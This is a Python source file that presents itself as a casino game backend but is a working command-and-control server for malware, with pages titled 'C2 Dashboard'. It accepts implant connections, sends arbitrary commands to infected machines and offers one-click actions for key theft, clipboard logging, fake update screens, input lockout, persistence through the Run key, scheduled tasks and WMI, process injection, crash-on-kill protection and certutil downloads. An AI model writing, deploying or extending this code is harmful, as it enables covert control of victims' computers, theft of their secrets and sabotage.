"""
Vivid Casino Engine - Game Backend Server

Manages player sessions, delivers admin commands,
hosts game modules, and provides the operator dashboard.
"""

import socket
import threading
import time
import os
import json
import uuid
from datetime import datetime

# Flask imports for web dashboard
try:
    from flask import Flask, render_template_string, request, redirect, url_for, flash
    from functools import wraps
except ImportError:
    print("[!] Flask not installed. Dashboard will not be available.")
    Flask = None

# Server configuration
GAME_HOST = "0.0.0.0"
GAME_SOCKET_PORT = 4444
DASHBOARD_PORT = 5000
MODULE_PORT = 8080

# Admin credentials (change in production)
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "Yuki8080*"

# Session management
session_lock = threading.Lock()
active_sessions = {}  # player_id -> PlayerSession

class PlayerSession:
    """Represents an active player connection."""

    def __init__(self, sock, player_id, addr):
        self.socket = sock
        self.player_id = player_id
        self.address = addr
        self.system_info = {}
        self.command_queue = []
        self.online = True
        self.log = []
        self.pending_commands = []
        self.last_command = None
        self.lock = threading.Lock()
        self._running = True
        self.last_heartbeat = time.time()

    def send_admin_command(self, command):
        """Queue an admin command for the player client."""
        with self.lock:
            self.command_queue.append(command)
            self.pending_commands.append(command)
            self.last_command = command

    def update_log(self, msg):
        """Log a message from the player client."""
        cmd = None
        with self.lock:
            cmd = self.last_command
            self.last_command = None
            self.pending_commands.clear()
        self.log.append({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command": cmd,
            "message": msg
        })
        if len(self.log) > 100:
            self.log = self.log[-50:]

    def update_heartbeat(self):
        self.last_heartbeat = time.time()

    def is_stale(self):
        return time.time() - self.last_heartbeat > 60

    def close(self):
        self._running = False
        try:
            self.socket.close()
        except:
            pass


def net_send(sock, data):
    """Send length-prefixed packet."""
    try:
        encoded = data.encode()
        header = f"{len(encoded):08d}".encode()
        sock.sendall(header)
        sock.sendall(encoded)
        return True
    except:
        return False

def net_recv(sock, timeout=2):
    """Receive length-prefixed packet. Returns None on timeout, raises on connection loss."""
    old_timeout = sock.gettimeout()
    sock.settimeout(timeout)
    try:
        header = b""
        while len(header) < 8:
            chunk = sock.recv(8 - len(header))
            if not chunk:
                raise ConnectionResetError("Peer closed connection")
            header += chunk
        length = int(header.decode())
        if length <= 0 or length > 1048576:
            return None
        data = b""
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                raise ConnectionResetError("Peer closed connection")
            data += chunk
        return data.decode()
    except socket.timeout:
        return None
    finally:
        sock.settimeout(old_timeout)


def player_receiver(session):
    """Thread that receives data from player client."""
    while session._running:
        try:
            msg = net_recv(session.socket, timeout=5)
            if msg:
                session.update_log(msg)
                session.update_heartbeat()
                print(f"[*] [{session.player_id}] Received: {msg[:100]}")
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            print(f"[!] [{session.player_id}] Connection lost: {e}")
            break
        except Exception as e:
            print(f"[!] [{session.player_id}] Receive error: {e}")
            break

    session._running = False
    with session.lock:
        session.online = False
    with session_lock:
        if session.player_id in active_sessions:
            active_sessions[session.player_id].online = False
    try:
        session.socket.close()
    except:
        pass


def player_sender(session):
    """Thread that sends commands to player client."""
    while session._running:
        command = None
        with session.lock:
            if session.command_queue:
                command = session.command_queue.pop(0)

        if command:
            if not net_send(session.socket, command):
                print(f"[!] [{session.player_id}] Send failed")
                session._running = False
                break
            print(f"[*] [{session.player_id}] Sent: {command}")

        time.sleep(0.5)

    session._running = False


def handle_player(client_socket, addr):
    """Handle a new player connection."""
    player_id = f"player_{uuid.uuid4().hex[:8]}"
    session = PlayerSession(client_socket, player_id, addr)

    with session_lock:
        active_sessions[player_id] = session

    print(f"[*] New player session: {player_id} from {addr}")

    # Receive player system info
    try:
        info = net_recv(client_socket, timeout=10)
    except (ConnectionResetError, BrokenPipeError, OSError):
        print(f"[!] {player_id} disconnected before handshake")
        session.close()
        with session_lock:
            active_sessions.pop(player_id, None)
        return

    if info:
        pairs = {}
        for p in info.split('|'):
            if '=' in p:
                k, v = p.split('=', 1)
                pairs[k.lower()] = v
        session.system_info = pairs
        print(f"[*] {player_id} system: {pairs}")
    else:
        print(f"[!] {player_id} no handshake data")
        session.close()
        with session_lock:
            active_sessions.pop(player_id, None)
        return

    # Start receiver and sender threads
    session._running = True
    recv_thread = threading.Thread(target=player_receiver, args=(session,))
    send_thread = threading.Thread(target=player_sender, args=(session,))
    recv_thread.daemon = True
    send_thread.daemon = True
    recv_thread.start()
    send_thread.start()

    recv_thread.join()
    send_thread.join()

    with session_lock:
        active_sessions.pop(player_id, None)
    print(f"[*] Player session ended: {player_id}")


# ============ DASHBOARD ============

app = Flask(__name__) if Flask else None
if app:
    app.secret_key = os.urandom(24)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not request.cookies.get('vce_auth'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>C2 Login</title><style>
body{background:#1a1a2e;color:#fff;font-family:Arial;padding:40px;}
form{max-width:300px;margin:100px auto;padding:30px;background:#16213e;border-radius:10px;}
input{width:100%;padding:10px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#ffd700;color:#000;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}
.error{color:#f44336;text-align:center;}
</style></head>
<body>
<form method="POST">
    <h2 style="text-align:center;color:#ffd700;">C2 Admin Login</h2>
    {% if error %}<p class="error">{{ error }}</p>{% endif %}
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
</form>
</body></html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>C2 Dashboard</title><style>
body{background:#1a1a2e;color:#fff;font-family:Arial,sans-serif;padding:20px;}
h1{color:#ffd700;}table{width:100%;border-collapse:collapse;margin-top:20px;}
th,td{padding:10px;text-align:left;border:1px solid #333;}
th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
.online{color:#4CAF50;}.offline{color:#f44336;}
.cmd-input{width:200px;padding:8px;border:none;border-radius:4px;}
.btn{padding:8px 16px;background:#ffd700;color:#000;border:none;border-radius:4px;cursor:pointer;margin-left:5px;}
.btn-del{background:#f44336;color:#fff;}
.btn-quick{background:#2196F3;color:#fff;}
.output{background:#0d1b2a;padding:10px;border-radius:4px;margin-top:5px;max-width:800px;white-space:pre-wrap;font-family:monospace;font-size:12px;word-break:break-word;}
.pending-output{color:#ff9800;font-style:italic;}
.cmd-name{font-family:monospace;font-size:12px;color:#888;}
.logout{float:right;color:#f44336;text-decoration:none;}
.log-table{width:100%;margin-top:10px;}
.log-table th{background:#0d1b2a;}
.log-table td{font-family:monospace;font-size:12px;}
.status-pending{color:#ff9800;}.status-done{color:#4CAF50;}
.modal{display:none;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,0.7);}
.modal-content{background:#16213e;margin:10% auto;padding:20px;border-radius:10px;width:500px;max-width:90%;}
.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;}
.modal-header h2{color:#ffd700;margin:0;}
.close-btn{color:#f44336;font-size:28px;font-weight:bold;cursor:pointer;}
.close-btn:hover{color:#fff;}
.cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;max-height:400px;overflow-y:auto;padding-right:5px;}
.cmd-btn{padding:12px;background:#1a1a2e;border:1px solid #333;border-radius:6px;color:#fff;cursor:pointer;text-align:left;font-size:13px;transition:background 0.2s;}
.cmd-btn:hover{background:#2196F3;border-color:#2196F3;}
.cmd-btn span{display:block;font-size:11px;color:#888;margin-top:2px;}
</style></head>
<body>
<h1>C2 Dashboard <a href="/logout" class="logout">Logout</a></h1>
<p>Server: {{ host }}:{{ port }} | Clients: {{ count }}</p>
<table>
<tr><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>Status</th><th>Last Seen</th><th>Command</th><th>Action</th></tr>
{% for cid, c in clients.items() %}
<tr>
<td>{{ cid }}</td>
<td>{{ c.system_info.get('host', 'unknown') }}</td>
<td>{{ c.system_info.get('user', 'unknown') }}</td>
<td>{{ c.system_info.get('system', 'unknown') }}</td>
<td class="{{ 'online' if c.online else 'offline' }}">{{ 'Online' if c.online else 'Offline' }}</td>
<td>{{ '%.0f'|format(time.time() - c.last_heartbeat) }}s ago</td>
<td>
<form method="POST" action="/send_command" style="display:inline;" id="form-{{ cid }}">
<input type="hidden" name="client_id" value="{{ cid }}">
<input type="text" name="command" class="cmd-input" placeholder="whoami">
<button type="submit" class="btn">Send</button>
<button type="button" class="btn btn-quick" onclick="openModal('{{ cid }}')">Quick</button>
</form>
</td>
<td>
<form method="POST" action="/delete_client" style="display:inline;">
<input type="hidden" name="client_id" value="{{ cid }}">
<button type="submit" class="btn btn-del" onclick="return confirm('Delete?')">Delete</button>
</form>
</td>
</tr>
{% if c.log or c.pending_commands %}
<tr>
<td colspan="8">
<table class="log-table">
<tr><th>Time</th><th>Command</th><th>Output</th></tr>
{% for cmd in c.pending_commands %}
<tr>
<td>{{ datetime.now().strftime("%Y-%m-%d %H:%M:%S") }}</td>
<td class="cmd-name">{{ cmd }}</td>
<td class="pending-output">pending</td>
</tr>
{% endfor %}
{% for entry in c.log[-5:] %}
<tr>
<td>{{ entry.timestamp }}</td>
<td class="cmd-name">{{ entry.command or '' }}</td>
<td class="output">{{ entry.message[:100000] if entry.message else '[waiting...]' }}</td>
</tr>
{% endfor %}
</table>
</td>
</tr>
{% endif %}
{% endfor %}
</table>
<p><a href="/" style="color:#ffd700;">Refresh</a></p>

<!-- Quick Commands Modal -->
<div id="quickModal" class="modal">
<div class="modal-content">
<div class="modal-header">
<h2>Quick Commands</h2>
<span class="close-btn" onclick="closeModal()">&times;</span>
</div>
<div class="cmd-grid">
<button type="button" class="cmd-btn" onclick="sendCmd('whoami')">whoami <span>Current user</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('hostname')">hostname <span>Machine name</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('systeminfo')">systeminfo <span>Full system info</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('ipconfig /all')">ipconfig /all <span>Network config</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('netstat -an')">netstat -an <span>Active connections</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('tasklist')">tasklist <span>Running processes</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('dir')">dir <span>List files</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('dir %USERPROFILE%')">dir %USERPROFILE% <span>User home files</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')">Registry Run Keys <span>Startup programs</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('net user')">net user <span>List users</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('qwinsta')">qwinsta <span>Remote sessions</span></button>
<button type="button" class="cmd-btn" onclick="sendCmd('schtasks /query /fo LIST')">Scheduled Tasks <span>Task scheduler</span></button>
<button type="button" class="cmd-btn" style="background:#1a0a0a;border-color:#f44336;" onclick="sendCmd('DISABLE_INPUT')">🚫 Disable Input <span>Block keyboard + mouse (admin)</span></button>
<button type="button" class="cmd-btn" style="background:#0a1a0a;border-color:#4CAF50;" onclick="sendCmd('ENABLE_INPUT')">✅ Enable Input <span>Restore keyboard + mouse</span></button>
<button type="button" class="cmd-btn" style="background:#0a0a3a;border-color:#2196F3;" onclick="sendCmd('WINDOWS_UPDATE')">🪟 Windows Update <span>Fake Windows updating screen</span></button>
<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#999;" onclick="sendCmd('APPLE_UPDATE')">🍎 Apple Update <span>Fake macOS updating screen</span></button>
<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Hide Update <span>Close update screen</span></button>
<button type="button" class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
<button type="button" class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
<button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('PROTECT_PROCESS')">🔒 Spawn Protected Copies <span>Auto-applies ALL layers: Run key, Task, WMI, Injection, NTFS — auto-protect after 15s</span></button>
<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('PROTECT_NOW')">⚡ Protect Now <span>Immediately mark this process CRITICAL (BSOD on kill)</span></button>
<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('UNPROTECT_PROCESS')">🔓 Unprotect Process <span>Remove critical flag from this client</span></button>
<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('CHECK_PROTECTION')">🛡️ Check Protection <span>Query if this process is critical (safe, no BSOD)</span></button>
<button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('WMI_PERSISTENCE')">🔱 WMI Persistence <span>root/subscription: triggers every 30s</span></button>
<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#009688;" onclick="sendCmd('INJECT_PROCESS')">💉 Inject Process <span>Inject payload into svchost/explorer</span></button>
<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#FF9800;" onclick="sendCmd('HARDEN_FILES')">🛡️ Harden Files <span>NTFS ACLs: deny delete</span></button>
<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="var url=prompt('URL:'); var path=prompt('Save path:'); if(url&&path) sendCmd('LOLBAS_DOWNLOAD '+url+' '+path)">🎭 LOLBAS Download <span>certutil download</span></button>
<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="var cmd=prompt('PowerShell command:'); if(cmd) sendCmd('OBFUSCATE_PS '+cmd)">📝 Obfuscate PS <span>Base64 encode</span></button>
</div>
</div>
</div>

<!-- Send Note Modal -->
<div id="noteModal" class="modal">
<div class="modal-content" style="width:600px;">
<div class="modal-header">
<h2>📝 Send Note to Target</h2>
<span class="close-btn" onclick="closeNoteModal()">&times;</span>
</div>
<form id="noteForm" method="POST" action="/send_command">
<input type="hidden" name="client_id" id="noteClientId">
<input type="hidden" name="command" id="noteCommand">
<textarea id="noteText" style="width:100%;height:200px;background:#1a1a2e;color:#fff;border:1px solid #333;border-radius:6px;padding:10px;font-family:monospace;font-size:13px;resize:vertical;box-sizing:border-box;" placeholder="Type your note here..."></textarea>
<div style="margin-top:15px;text-align:right;">
<button type="button" class="btn" style="background:#4CAF50;color:#fff;" onclick="sendNote()">Send Note</button>
</div>
</form>
</div>
</div>

<script>
var activeClientId = '';
var activeMachineType = 'desktop';
var activeArch = 'x64';

function openModal(clientId) {
    activeClientId = clientId;
    document.getElementById('quickModal').style.display = 'block';
}
function closeModal() {
    document.getElementById('quickModal').style.display = 'none';
}
function sendCmd(cmd) {
    closeModal();
    var form = document.getElementById('form-' + activeClientId);
    form.querySelector('input[name=\"command\"]').value = cmd;
    form.submit();
}
function openNoteModal() {
    if (!activeClientId) { alert('Please select a client first'); return; }
    closeModal();
    document.getElementById('noteClientId').value = activeClientId;
    document.getElementById('noteModal').style.display = 'block';
    document.getElementById('noteText').value = '';
    document.getElementById('noteText').focus();
}
function closeNoteModal() {
    document.getElementById('noteModal').style.display = 'none';
}
function sendNote() {
    var text = document.getElementById('noteText').value;
    if (!text.trim()) { alert('Enter some text first'); return; }
    document.getElementById('noteCommand').value = 'NOTE|' + text;
    document.getElementById('noteForm').submit();
}
window.onclick = function(event) {
    var modal = document.getElementById('quickModal');
    if (event.target == modal) {
        modal.style.display = 'none';
    }
    var noteModal = document.getElementById('noteModal');
    if (event.target == noteModal) {
        noteModal.style.display = 'none';
    }
}
</script>
</body></html>
"""

if app:
    @app.route('/')
    @login_required
    def dashboard():
        with session_lock:
            clients = dict(active_sessions)
        return render_template_string(DASHBOARD_TEMPLATE,
            clients=clients,
            host=GAME_HOST,
            port=GAME_SOCKET_PORT,
            count=len(clients),
            time=time,
            datetime=datetime)

    @app.route('/login', methods=['GET', 'POST'])
    def login():
        error = None
        if request.method == 'POST':
            if request.form.get('username') == ADMIN_USERNAME and \
               request.form.get('password') == ADMIN_PASSWORD:
                resp = redirect(url_for('dashboard'))
                resp.set_cookie('vce_auth', '1')
                return resp
            error = 'Invalid credentials'
        return render_template_string(LOGIN_TEMPLATE, error=error)

    @app.route('/logout')
    def logout():
        resp = redirect(url_for('login'))
        resp.delete_cookie('vce_auth')
        return resp

    @app.route('/send_command', methods=['POST'])
    @login_required
    def send_command():
        player_id = request.form.get('client_id')
        command = request.form.get('command')
        if not player_id or not command:
            return "Missing parameters", 400

        client = None
        with session_lock:
            if player_id in active_sessions:
                client = active_sessions[player_id]

        if client:
            client.send_admin_command(command)
            return redirect(url_for('dashboard'))
        else:
            return "Client not found", 404

    @app.route('/delete_client', methods=['POST'])
    @login_required
    def delete_client():
        player_id = request.form.get('client_id')
        if not player_id:
            return "Missing client_id", 400
        with session_lock:
            if player_id in active_sessions:
                active_sessions[player_id].close()
                active_sessions.pop(player_id, None)
        return redirect(url_for('dashboard'))

    @app.route('/broadcast_command', methods=['POST'])
    @login_required
    def broadcast_command():
        command = request.form.get('command')
        if not command:
            return "Missing command", 400
        with session_lock:
            for client in active_sessions.values():
                client.send_admin_command(command)
        return redirect(url_for('dashboard'))


def start_socket_server():
    """Start the game socket server for player connections."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.bind((GAME_HOST, GAME_SOCKET_PORT))
    server.listen(5)
    print(f"[*] Game server listening on {GAME_HOST}:{GAME_SOCKET_PORT}")

    while True:
        try:
            client_socket, addr = server.accept()
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            print(f"[*] Player connection from {addr}")
            thread = threading.Thread(target=handle_player, args=(client_socket, addr))
            thread.daemon = True
            thread.start()
        except Exception as e:
            print(f"[!] Server error: {e}")


def start_dashboard():
    """Start the web dashboard."""
    if app:
        print(f"[*] Dashboard starting on http://0.0.0.0:{DASHBOARD_PORT}")
        app.run(host='0.0.0.0', port=DASHBOARD_PORT, debug=False, threaded=True)
    else:
        print("[!] Dashboard disabled (Flask not installed)")


if __name__ == '__main__':
    # Start game socket server
    socket_thread = threading.Thread(target=start_socket_server)
    socket_thread.daemon = True
    socket_thread.start()

    # Start dashboard
    start_dashboard()
